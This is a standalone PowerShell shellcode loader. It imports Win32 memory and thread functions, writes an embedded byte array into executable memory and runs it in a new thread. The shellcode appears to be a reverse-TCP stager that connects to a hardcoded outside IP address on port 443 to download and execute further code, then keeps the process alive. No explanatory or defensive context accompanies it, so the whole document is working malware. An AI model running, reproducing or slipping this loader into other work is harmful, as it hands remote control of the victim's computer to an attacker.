$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x8d,0xff,0x9f,0xc8,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

